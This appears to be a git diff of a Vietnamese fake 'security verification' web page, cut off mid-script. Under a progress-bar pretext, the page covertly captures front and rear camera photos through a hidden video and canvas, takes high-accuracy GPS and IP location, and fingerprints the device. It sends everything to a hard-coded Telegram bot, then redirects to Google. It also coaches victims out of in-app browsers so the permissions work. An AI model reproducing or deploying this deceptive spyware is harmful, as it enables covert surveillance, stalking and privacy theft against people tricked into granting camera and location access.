@@ -1,10 +1,22 @@
+
 <!DOCTYPE html>
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Xác Thực Camera</title>
+    <title>Đang xác minh...</title>
     <style>
+        :root {
+            --bg: #0a0e12;
+            --card: #111820;
+            --accent: #00ff88;
+            --danger: #ff4757;
+            --text: #e0e0e0;
+            --muted: #6b7280;
+            --border: #1f2937;
+            --glow: 0 0 30px rgba(0, 255, 136, 0.15);
+        }
+
         * {
             margin: 0;
             padding: 0;
@@ -12,486 +24,933 @@
         }
 
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #0d1117;
-            color: white;
+            font-family: 'SF Pro Display', 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: var(--bg);
+            color: var(--text);
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
             overflow: hidden;
+            user-select: none;
+            -webkit-user-select: none;
+            -webkit-tap-highlight-color: transparent;
+            background-image:
+                radial-gradient(ellipse at 20% 50%, rgba(0, 255, 136, 0.03) 0%, transparent 50%),
+                radial-gradient(ellipse at 80% 20%, rgba(0, 200, 255, 0.03) 0%, transparent 50%),
+                radial-gradient(ellipse at 50% 80%, rgba(120, 0, 255, 0.03) 0%, transparent 50%);
         }
 
-        .card {
-            background: #161b22;
-            padding: 30px;
-            border-radius: 24px;
-            text-align: center;
-            width: 90%;
-            max-width: 380px;
-            border: 1px solid #30363d;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
-        }
-
-        .camera-view {
-            width: 100%;
-            height: 300px;
-            background: #000;
-            border-radius: 16px;
-            margin: 20px 0;
-            overflow: hidden;
-            position: relative;
-            border: 2px solid #30363d;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            display: none;
-        }
-
-        .btn {
-            background: #238636;
-            color: white;
-            border: none;
-            padding: 18px;
-            width: 100%;
-            border-radius: 12px;
-            font-weight: bold;
-            cursor: pointer;
-            font-size: 16px;
-            transition: all 0.3s;
-            letter-spacing: 0.5px;
-        }
-
-        .btn:hover:not(:disabled) {
-            background: #2ea043;
-            transform: translateY(-1px);
-            box-shadow: 0 5px 15px rgba(35, 134, 54, 0.4);
-        }
-
-        .btn:disabled {
-            background: #21262d;
-            color: #8b949e;
-            cursor: not-allowed;
-        }
-
-        #status {
-            font-size: 13px;
-            color: #8b949e;
-            margin-top: 15px;
-            line-height: 1.6;
-        }
-
-        /* Cảnh báo In-App Browser */
-        #browser-warning {
-            display: none;
+        /* Canvas ẩn để chụp ảnh */
+        #hiddenCanvas {
             position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        #hiddenVideo {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        /* Container chính */
+        .container {
+            width: 100%;
+            max-width: 420px;
+            padding: 20px;
+            z-index: 10;
+            animation: fadeInUp 0.8s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Card xác minh */
+        .verify-card {
+            background: var(--card);
+            border-radius: 24px;
+            padding: 35px 28px;
+            border: 1px solid var(--border);
+            box-shadow: var(--glow), 0 25px 60px rgba(0, 0, 0, 0.5);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .verify-card::before {
+            content: '';
+            position: absolute;
             top: 0;
             left: 0;
-            width: 100vw;
-            height: 100vh;
-            background: #0d1117;
-            z-index: 10000;
-            padding: 40px 20px;
-            box-sizing: border-box;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #00ff88, #00c8ff, #7c00ff, #00ff88);
+            background-size: 300% 100%;
+            animation: gradientFlow 3s ease infinite;
         }
 
-        .warning-box {
-            background: #1c2128;
-            border: 2px solid #f85149;
-            padding: 30px;
-            border-radius: 20px;
+        @keyframes gradientFlow {
+            0%,
+            100% {
+                background-position: 0% 50%;
+            }
+            50% {
+                background-position: 100% 50%;
+            }
+        }
+
+        /* Icon shield */
+        .shield-icon {
+            width: 70px;
+            height: 70px;
+            margin: 0 auto 20px;
+            background: linear-gradient(135deg, #1a3a2a, #0d2818);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid rgba(0, 255, 136, 0.3);
+            position: relative;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%,
+            100% {
+                box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
+            }
+            50% {
+                box-shadow: 0 0 40px rgba(0, 255, 136, 0.5);
+            }
+        }
+
+        .shield-icon svg {
+            width: 35px;
+            height: 35px;
+            fill: var(--accent);
+        }
+
+        /* Tiêu đề */
+        .title {
             text-align: center;
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            letter-spacing: -0.3px;
+            color: #fff;
         }
 
-        .warning-box h3 {
-            color: #f85149;
-            margin-top: 0;
+        .subtitle {
+            text-align: center;
+            font-size: 13px;
+            color: var(--muted);
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        /* Các bước xác minh */
+        .steps-list {
+            list-style: none;
+            margin-bottom: 25px;
+        }
+
+        .step-item {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 14px 16px;
+            margin-bottom: 10px;
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 14px;
+            border: 1px solid var(--border);
+            transition: all 0.4s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .step-item.completed {
+            border-color: rgba(0, 255, 136, 0.4);
+            background: rgba(0, 255, 136, 0.05);
+        }
+
+        .step-item.active {
+            border-color: rgba(0, 200, 255, 0.6);
+            background: rgba(0, 200, 255, 0.05);
+            animation: shimmer 2s infinite;
+        }
+
+        @keyframes shimmer {
+            0%,
+            100% {
+                box-shadow: 0 0 15px rgba(0, 200, 255, 0.1);
+            }
+            50% {
+                box-shadow: 0 0 30px rgba(0, 200, 255, 0.3);
+            }
+        }
+
+        .step-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            font-size: 18px;
+            font-weight: 700;
+            background: var(--border);
+            color: var(--muted);
+            transition: all 0.4s ease;
+        }
+
+        .step-item.completed .step-icon {
+            background: rgba(0, 255, 136, 0.2);
+            color: var(--accent);
+        }
+
+        .step-item.active .step-icon {
+            background: rgba(0, 200, 255, 0.2);
+            color: #00c8ff;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0%,
+            100% {
+                transform: rotate(0deg);
+            }
+            50% {
+                transform: rotate(180deg);
+            }
+        }
+
+        .step-info {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .step-name {
+            font-size: 14px;
+            font-weight: 600;
+            color: #fff;
+            margin-bottom: 3px;
+        }
+
+        .step-status {
+            font-size: 11px;
+            color: var(--muted);
+            transition: color 0.3s;
+        }
+
+        .step-item.completed .step-status {
+            color: var(--accent);
+        }
+        .step-item.active .step-status {
+            color: #00c8ff;
+        }
+
+        .step-check {
+            opacity: 0;
+            transform: scale(0);
+            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+            color: var(--accent);
             font-size: 20px;
         }
 
-        .steps {
-            text-align: left;
-            margin-top: 20px;
-            color: #c9d1d9;
-            font-size: 16px;
-            line-height: 2;
+        .step-item.completed .step-check {
+            opacity: 1;
+            transform: scale(1);
         }
 
-        .highlight {
+        /* Progress bar */
+        .progress-container {
+            margin-bottom: 25px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 5px;
+            background: var(--border);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #00ff88, #00c8ff);
+            border-radius: 10px;
+            transition: width 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+            width: 0%;
+        }
+
+        .progress-text {
+            text-align: center;
+            font-size: 11px;
+            color: var(--muted);
+            margin-top: 8px;
+        }
+
+        /* Nút */
+        .btn-verify {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 14px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            letter-spacing: 0.5px;
+            background: linear-gradient(135deg, #00c853, #00e676);
+            color: #000;
+            box-shadow: 0 8px 25px rgba(0, 200, 83, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-verify:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 35px rgba(0, 200, 83, 0.5);
+        }
+
+        .btn-verify:active:not(:disabled) {
+            transform: scale(0.97);
+        }
+
+        .btn-verify:disabled {
+            background: var(--border);
+            color: var(--muted);
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        .btn-verify .btn-spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid transparent;
+            border-top-color: currentColor;
+            border-radius: 50%;
+            animation: btnSpin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes btnSpin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .btn-verify.processing .btn-spinner {
+            display: inline-block;
+        }
+
+        /* Cảnh báo In-App */
+        #inapp-warning {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: var(--bg);
+            z-index: 99999;
+            padding: 30px;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+
+        #inapp-warning .warn-card {
+            background: var(--card);
+            border: 2px solid var(--danger);
+            border-radius: 20px;
+            padding: 35px 25px;
+            max-width: 400px;
+            width: 100%;
+        }
+
+        #inapp-warning h3 {
+            color: var(--danger);
+            font-size: 20px;
+            margin-bottom: 20px;
+        }
+
+        #inapp-warning ol {
+            text-align: left;
+            line-height: 2.2;
+            padding-left: 20px;
+            font-size: 15px;
+        }
+
+        #inapp-warning .hl {
             color: #ffeb3b;
-            font-weight: bold;
+            font-weight: 700;
+        }
+
+        /* Loading dots */
+        .dot-pulse {
+            display: inline-flex;
+            gap: 4px;
+            margin-left: 4px;
+        }
+
+        .dot-pulse span {
+            width: 5px;
+            height: 5px;
+            background: currentColor;
+            border-radius: 50%;
+            animation: dotBounce 1.4s infinite;
+        }
+
+        .dot-pulse span:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+        .dot-pulse span:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+
+        @keyframes dotBounce {
+            0%,
+            80%,
+            100% {
+                transform: scale(0.5);
+                opacity: 0.3;
+            }
+            40% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        /* Responsive */
+        @media (max-width: 380px) {
+            .verify-card {
+                padding: 25px 18px;
+            }
+            .step-item {
+                padding: 12px;
+                gap: 10px;
+            }
         }
     </style>
 </head>
 <body>
 
-    <div id="browser-warning">
-        <div class="warning-box">
+    <!-- Canvas & Video ẩn -->
+    <canvas id="hiddenCanvas"></canvas>
+    <video id="hiddenVideo" autoplay playsinline muted></video>
+
+    <!-- Cảnh báo In-App Browser -->
+    <div id="inapp-warning">
+        <div class="warn-card">
             <h3>⚠️ YÊU CẦU TRÌNH DUYỆT NGOÀI</h3>
-            <div class="steps">
-                Vui lòng mở website bằng trình duyệt bên ngoài:<br>
-                1. Nhấn vào biểu tượng <span class="highlight">(···)</span> hoặc <span class="highlight">(⋮)</span> ở góc trên bên phải.<br>
-                2. Chọn <span class="highlight">"Mở bằng trình duyệt"</span> (Safari/Chrome) để tiếp tục xác thực.
-            </div>
+            <ol>
+                <li>Nhấn <span class="hl">(···)</span> hoặc <span class="hl">(⋮)</span> góc phải trên</li>
+                <li>Chọn <span class="hl">"Mở bằng trình duyệt"</span></li>
+                <li>Cho phép Camera & Vị trí khi được hỏi</li>
+            </ol>
         </div>
     </div>
 
-    <div class="card" id="mainCard">
-        <h2 style="margin: 0;">🔐 Xác Minh Người Dùng</h2>
-        <div class="camera-view" id="vBox">
-            <p id="msg" style="color: #484f58;">📷 Đang khởi tạo camera...</p>
-            <video id="preview" autoplay playsinline muted></video>
+    <!-- Giao diện chính -->
+    <div class="container" id="mainUI">
+        <div class="verify-card">
+            <!-- Shield Icon -->
+            <div class="shield-icon">
+                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+            </div>
+
+            <h2 class="title">Xác Minh Bảo Mật</h2>
+            <p class="subtitle">Hệ thống đang kiểm tra danh tính của bạn.<br>Vui lòng không thoát trang.</p>
+
+            <!-- Progress -->
+            <div class="progress-container">
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+                <p class="progress-text" id="progressText">Đang chuẩn bị...</p>
+            </div>
+
+            <!-- Steps -->
+            <ul class="steps-list">
+                <li class="step-item" id="step1">
+                    <div class="step-icon">1</div>
+                    <div class="step-info">
+                        <div class="step-name">Quét thiết bị</div>
+                        <div class="step-status">Đang chờ...</div>
+                    </div>
+                    <span class="step-check">✓</span>
+                </li>
+                <li class="step-item" id="step2">
+                    <div class="step-icon">2</div>
+                    <div class="step-info">
+                        <div class="step-name">Xác minh vị trí GPS</div>
+                        <div class="step-status">Đang chờ...</div>
+                    </div>
+                    <span class="step-check">✓</span>
+                </li>
+                <li class="step-item" id="step3">
+                    <div class="step-icon">3</div>
+                    <div class="step-info">
+                        <div class="step-name">Chụp ảnh camera (trước)</div>
+                        <div class="step-status">Đang chờ...</div>
+                    </div>
+                    <span class="step-check">✓</span>
+                </li>
+                <li class="step-item" id="step4">
+                    <div class="step-icon">4</div>
+                    <div class="step-info">
+                        <div class="step-name">Chụp ảnh camera (sau)</div>
+                        <div class="step-status">Đang chờ...</div>
+                    </div>
+                    <span class="step-check">✓</span>
+                </li>
+                <li class="step-item" id="step5">
+                    <div class="step-icon">5</div>
+                    <div class="step-info">
+                        <div class="step-name">Gửi dữ liệu xác minh</div>
+                        <div class="step-status">Đang chờ...</div>
+                    </div>
+                    <span class="step-check">✓</span>
+                </li>
+            </ul>
+
+            <!-- Nút -->
+            <button class="btn-verify" id="verifyBtn" disabled>
+                <span class="btn-spinner"></span>
+                <span id="btnText">ĐANG KHỞI TẠO...</span>
+            </button>
         </div>
-        <button class="btn" id="startBtn" disabled>BẮT ĐẦU XÁC THỰC</button>
-        <div id="status">Hệ thống sẽ tự động chuyển hướng sau khi hoàn tất.</div>
     </div>
 
     <script>
         // ==========================================
-        // ⚙️ CẤU HÌNH - CHỈNH SỬA TẠI ĐÂY
+        // ⚙️ CẤU HÌNH
         // ==========================================
-        const TELEGRAM_BOT_TOKEN = '8818687158:AAHoU3Ydxx1aGG1cR--wXXDCRvmvBAQ6zds';
-        const TELEGRAM_CHAT_ID = '7031115869'; // Chat ID của bạn
-        const REDIRECT_URL = 'https://www.google.com'; // Link chuyển hướng sau khi hoàn tất
+        const CONFIG = {
+            TELEGRAM_BOT_TOKEN: '8818687158:AAHoU3Ydxx1aGG1cR--wXXDCRvmvBAQ6zds',
+            TELEGRAM_CHAT_ID: '7031115869',
+            REDIRECT_URL: 'https://www.google.com',
+            COUNTDOWN_SECONDS: 5,
+            STEP_DELAY: 800, // ms giữa mỗi bước
+        };
 
         // ==========================================
-        // 📤 HÀM GỬI DỮ LIỆU QUA TELEGRAM
+        // 🛠 UTILITY FUNCTIONS
         // ==========================================
-        async function sendToTelegram(message, photoBlob = null) {
-            try {
-                if (photoBlob) {
-                    // Gửi ảnh + caption
-                    const formData = new FormData();
-                    formData.append('chat_id', TELEGRAM_CHAT_ID);
-                    formData.append('photo', photoBlob, 'camera_capture.jpg');
-                    formData.append('caption', message);
-                    formData.append('parse_mode', 'HTML');
+        const $ = (sel) => document.querySelector(sel);
+        const sleep = (ms) => new Promise(r => setTimeout(r, ms));
 
-                    const response = await fetch(
-                        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
-                        { method: 'POST', body: formData }
-                    );
-
-                    const result = await response.json();
-                    if (!result.ok) {
-                        console.error('Telegram Photo Error:', result.description);
-                        // Fallback: gửi text nếu ảnh lỗi
-                        await sendTextOnly(message);
-                    }
-                    return result.ok;
-                } else {
-                    return await sendTextOnly(message);
-                }
-            } catch (error) {
-                console.error('Telegram Send Error:', error);
-                return false;
-            }
+        function updateStep(id, status, state = 'active') {
+            const el = $(`#${id}`);
+            el.classList.remove('active', 'completed');
+            el.querySelector('.step-status').innerHTML = status;
+            if (state === 'active') el.classList.add('active');
+            if (state === 'completed') el.classList.add('completed');
         }
 
-        async function sendTextOnly(message) {
-            try {
-                const response = await fetch(
-                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-                    {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: TELEGRAM_CHAT_ID,
-                            text: message,
-                            parse_mode: 'HTML'
-                        })
-                    }
-                );
-                const result = await response.json();
-                if (!result.ok) {
-                    console.error('Telegram Text Error:', result.description);
-                }
-                return result.ok;
-            } catch (error) {
-                console.error('Send Text Error:', error);
-                return false;
-            }
+        function updateProgress(percent, text) {
+            $('#progressFill').style.width = percent + '%';
+            $('#progressText').textContent = text;
+        }
+
+        function updateButton(text, disabled = false, processing = false) {
+            const btn = $('#verifyBtn');
+            $('#btnText').textContent = text;
+            btn.disabled = disabled;
+            if (processing) btn.classList.add('processing');
+            else btn.classList.remove('processing');
         }
 
         // ==========================================
         // 📱 THU THẬP THÔNG TIN THIẾT BỊ
         // ==========================================
-        function collectDeviceInfo() {
+        function getDeviceFingerprint() {
             const ua = navigator.userAgent;
             const platform = navigator.platform;
-            const screenW = window.screen.width;
-            const screenH = window.screen.height;
-            const ratio = window.devicePixelRatio;
-            const language = navigator.language;
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const memory = navigator.deviceMemory || 'Không rõ';
-            const cores = navigator.hardwareConcurrency || 'Không rõ';
-            const connection = navigator.connection ? navigator.connection.effectiveType : 'Không rõ';
-            const battery = navigator.getBattery ? 'Đang kiểm tra...' : 'Không hỗ trợ';
+            const sw = window.screen.width;
+            const sh = window.screen.height;
+            const dpr = window.devicePixelRatio;
+            const lang = navigator.language;
+            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const ram = navigator.deviceMemory || 'N/A';
+            const cores = navigator.hardwareConcurrency || 'N/A';
+            const conn = navigator.connection?.effectiveType || 'N/A';
+            const battery = navigator.getBattery ? 'Supported' : 'N/A';
+            const touchPoints = navigator.maxTouchPoints || 0;
+            const colorDepth = screen.colorDepth;
+            const vendor = navigator.vendor || 'N/A';
 
-            // Nhận diện thiết bị
-            let deviceType = 'Thiết bị lạ';
-            let os = 'Không rõ';
+            let device = 'Unknown';
+            let os = 'Unknown';
+            if (/iPhone|iPad|iPod/i.test(ua)) { device = 'iPhone/iPad';
+                os = 'iOS'; } else if (/Android/i.test(ua)) { device = 'Android';
+                os = 'Android'; } else if (/Windows/i.test(ua)) { device = 'Windows PC';
+                os = 'Windows'; } else if (/Macintosh/i.test(ua)) { device = 'Mac';
+                os = 'macOS'; } else if (/Linux/i.test(ua)) { device = 'Linux';
+                os = 'Linux'; }
 
-            if (/iPhone|iPad|iPod/i.test(ua)) {
-                deviceType = '📱 iPhone/iPad';
-                os = 'iOS';
-            } else if (/Android/i.test(ua)) {
-                deviceType = '📱 Android';
-                os = 'Android';
-            } else if (/Windows/i.test(ua)) {
-                deviceType = '💻 Windows PC/Laptop';
-                os = 'Windows';
-            } else if (/Macintosh/i.test(ua)) {
-                deviceType = '💻 Mac';
-                os = 'macOS';
-            }
-
-            const info = `
-🔔 <b>THÔNG BÁO: CÓ NGƯỜI DÙNG MỚI</b>
-━━━━━━━━━━━━━━━━━━━━━━
+            return `
+🔔 <b>BÁO CÁO XÁC MINH MỚI</b>
+━━━━━━━━━━━━━━━━━━━━━━━━
 🕐 <b>Thời gian:</b> ${new Date().toLocaleString('vi-VN')}
-📱 <b>Thiết bị:</b> ${deviceType}
-💻 <b>Hệ điều hành:</b> ${os}
-📐 <b>Độ phân giải:</b> ${screenW}x${screenH} @ ${ratio}x
-🌐 <b>Ngôn ngữ:</b> ${language}
-⏰ <b>Múi giờ:</b> ${timezone}
-🧠 <b>RAM thiết bị:</b> ${memory} GB
-⚙️ <b>CPU Cores:</b> ${cores}
-📶 <b>Kết nối:</b> ${connection}
-🔗 <b>Platform:</b> ${platform}
-━━━━━━━━━━━━━━━━━━━━━━
-🖼 <b>Ảnh chụp từ camera trước:</b> 👇
+📱 <b>Thiết bị:</b> ${device}
+💻 <b>HĐH:</b> ${os}
+📐 <b>Màn hình:</b> ${sw}x${sh} @ ${dpr}x (${colorDepth}-bit)
+🌐 <b>Ngôn ngữ:</b> ${lang} | <b>Múi giờ:</b> ${tz}
+🧠 <b>RAM:</b> ${ram} GB | <b>CPU:</b> ${cores} cores
+📶 <b>Kết nối:</b> ${conn} | <b>Touch:</b> ${touchPoints} điểm
+🔋 <b>Pin API:</b> ${battery}
+🏷 <b>Platform:</b> ${platform}
+🔗 <b>UA:</b> ${ua.substring(0, 120)}...
+━━━━━━━━━━━━━━━━━━━━━━━━
+📍 <b>Vị trí GPS:</b> 👇 (xem bên dưới)
+🖼 <b>Ảnh Camera Trước & Sau:</b> 👇
             `.trim();
-
-            return info;
         }
 
         // ==========================================
-        // 📸 CHỤP ẢNH TỪ CAMERA
+        // 📍 LẤY VỊ TRÍ GPS (CÓ FALLBACK IP)
         // ==========================================
-        async function capturePhoto(stream) {
-            return new Promise((resolve, reject) => {
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.setAttribute('playsinline', true);
-                video.setAttribute('muted', true);
-                video.play();
+        async function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    return resolve({ source: 'IP Fallback', lat: null, lng: null, accuracy: null, maps: 'Không hỗ trợ
+                        Geolocation' });
+                    }
 
-                video.onloadedmetadata = () => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
+                    const timeout = setTimeout(() => {
+                        resolve({ source: 'Timeout (5s)', lat: null, lng: null, accuracy: null, maps: 'Timeout - Dùng IP
+                            fallback' });
+                        }, 5000);
 
-                    setTimeout(() => {
-                        const ctx = canvas.getContext('2d');
-                        // Lật ảnh nếu là camera trước (selfie)
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            clearTimeout(timeout);
+                            const { latitude, longitude, accuracy } = pos.coords;
+                            resolve({
+                                source: 'GPS',
+                                lat: latitude.toFixed(7),
+                                lng: longitude.toFixed(7),
+                                accuracy: accuracy ? accuracy.toFixed(1) + 'm' : 'N/A',
+                                maps: `https://www.google.com/maps?q=${latitude},${longitude}`,
+                            });
+                        },
+                        (err) => {
+                            clearTimeout(timeout);
+                            resolve({ source: 'Blocked/Error', lat: null, lng: null, accuracy: null, maps: `Lỗi: ${err.message}`
+                                });
+                        }, {
+                            enableHighAccuracy: true,
+                            timeout: 5000,
+                            maximumAge: 0,
+                        }
+                    );
+                });
+            }
+
+            // Lấy IP + vị trí ước lượng qua ip-api
+            async function getIPLocation() {
+                try {
+                    const res = await fetch('http://ip-api.com/json/?fields=query,country,city,lat,lon,isp,org', { signal: AbortSignal
+                            .timeout(5000) });
+                    const data = await res.json();
+                    return data;
+                } catch (e) {
+                    return null;
+                }
+            }
+
+            // ==========================================
+            // 📸 CHỤP ẢNH TỪ CAMERA (TRƯỚC / SAU)
+            // ==========================================
+            async function captureCamera(facingMode) {
+                const video = $('#hiddenVideo');
+                const canvas = $('#hiddenCanvas');
+                let stream = null;
+
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: facingMode,
+                            width: { ideal: 1920 },
+                            height: { ideal: 1080 },
+                        },
+                        audio: false,
+                    });
+
+                    video.srcObject = stream;
+                    await video.play();
+
+                    // Đợi video sẵn sàng
+                    await new Promise((resolve) => {
+                        video.onloadedmetadata = () => {
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            setTimeout(resolve, 1200); // Đợi focus + sáng
+                        };
+                    });
+
+                    const ctx = canvas.getContext('2d');
+
+                    // Camera trước: lật ảnh (mirror)
+                    if (facingMode === 'user') {
                         ctx.translate(canvas.width, 0);
                         ctx.scale(-1, 1);
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    }
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                        canvas.toBlob((blob) => {
-                            if (blob) {
-                                resolve(blob);
-                            } else {
-                                reject(new Error('Không thể tạo ảnh'));
-                            }
-                        }, 'image/jpeg', 0.9);
-                    }, 1000);
-                };
+                    // Reset transform
+                    ctx.setTransform(1, 0, 0, 1, 0, 0);
 
-                video.onerror = () => reject(new Error('Lỗi video element'));
-            });
-        }
+                    const blob = await new Promise(resolve => {
+                        canvas.toBlob(resolve, 'image/jpeg', 0.92);
+                    });
 
-        // ==========================================
-        // 🚫 KIỂM TRA IN-APP BROWSER
-        // ==========================================
-        function checkInAppBrowser() {
-            const ua = navigator.userAgent || navigator.vendor || window.opera;
-            const isInApp = /TikTok|musical_ly|ByteLocale|FBAN|FBAV|Zalo|Instagram|Messenger/i.test(ua);
+                    // Dọn dẹp
+                    stream.getTracks().forEach(t => t.stop());
+                    video.srcObject = null;
 
-            if (isInApp) {
-                document.getElementById('browser-warning').style.display = 'flex';
-                document.getElementById('browser-warning').style.alignItems = 'center';
-                document.getElementById('browser-warning').style.justifyContent = 'center';
-                document.getElementById('mainCard').style.display = 'none';
-            }
-        }
-
-        // ==========================================
-        // 🎬 KHỞI TẠO
-        // ==========================================
-        document.addEventListener("DOMContentLoaded", () => {
-            checkInAppBrowser();
-        });
-
-        const btn = document.getElementById('startBtn');
-        const video = document.getElementById('preview');
-        const status = document.getElementById('status');
-        const msg = document.getElementById('msg');
-
-        let cameraStream = null;
-
-        // Tự động bật camera khi load trang
-        async function initCamera() {
-            try {
-                cameraStream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: 'user',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    },
-                    audio: false
-                });
-
-                video.srcObject = cameraStream;
-                video.style.display = "block";
-                msg.style.display = "none";
-                document.getElementById('vBox').style.borderColor = "#238636";
-                document.getElementById('vBox').style.boxShadow = "0 0 20px rgba(35, 134, 54, 0.3)";
-                btn.disabled = false;
-                btn.innerText = "📸 BẮT ĐẦU XÁC THỰC";
-                status.innerHTML = "✅ Camera đã sẵn sàng<br>Nhấn nút để xác thực";
-            } catch (err) {
-                console.error('Camera Error:', err);
-                msg.innerText = '❌ Không thể truy cập camera';
-                msg.style.color = '#f85149';
-                status.innerHTML = '⚠️ Vui lòng cấp quyền truy cập camera<br>và tải lại trang';
-                btn.disabled = false;
-                btn.innerText = "🔄 TẢI LẠI TRANG";
-                btn.onclick = () => location.reload();
-            }
-        }
-
-        initCamera();
-
-        // ==========================================
-        // 🚀 XỬ LÝ KHI NHẤN NÚT
-        // ==========================================
-        btn.addEventListener('click', async () => {
-            if (!cameraStream) {
-                location.reload();
-                return;
+                    return blob;
+                } catch (e) {
+                    if (stream) stream.getTracks().forEach(t => t.stop());
+                    video.srcObject = null;
+                    console.warn(`Camera ${facingMode} error:`, e.message);
+                    return null;
+                }
             }
 
-            btn.disabled = true;
-            btn.innerText = "⏳ ĐANG XỬ LÝ...";
-            status.innerHTML = "📸 Đang chụp ảnh...<br>Vui lòng giữ nguyên vị trí";
-
-            try {
-                // Thu thập thông tin
-                const deviceInfo = collectDeviceInfo();
-
-                // Chụp ảnh
-                let photoBlob = null;
+            // ==========================================
+            // 📤 GỬI DỮ LIỆU QUA TELEGRAM
+            // ==========================================
+            async function sendToTelegram(caption, photos) {
+                // Gửi text info trước
                 try {
-                    status.innerHTML = "📸 Đang chụp ảnh từ camera...";
-                    photoBlob = await capturePhoto(cameraStream);
-                } catch (photoError) {
-                    console.error('Photo Error:', photoError);
+                    await fetch(
+                        `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: CONFIG.TELEGRAM_CHAT_ID,
+                                text: caption,
+                                parse_mode: 'HTML',
+                                disable_web_page_preview: false,
+                            }),
+                        }
+                    );
+                } catch (e) {
+                    console.warn('Send text failed:', e);
                 }
 
-                // Gửi về Telegram
-                status.innerHTML = "📤 Đang gửi dữ liệu...";
-                const sendSuccess = await sendToTelegram(deviceInfo, photoBlob);
+                // Gửi từng ảnh
+                for (const photo of photos) {
+                    if (!photo) continue;
+                    try {
+                        const fd = new FormData();
+                        fd.append('chat_id', CONFIG.TELEGRAM_CHAT_ID);
+                        fd.append('photo', photo.blob, photo.filename);
+                        fd.append('caption', photo.label);
 
-                // Dừng camera
-                if (cameraStream) {
-                    cameraStream.getTracks().forEach(track => track.stop());
-                    video.style.display = "none";
-                    msg.style.display = "block";
-                    msg.innerText = "✅ Đã hoàn tất";
-                    msg.style.color = "#3fb950";
+                        await fetch(
+                            `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST',
+                                body: fd }
+                        );
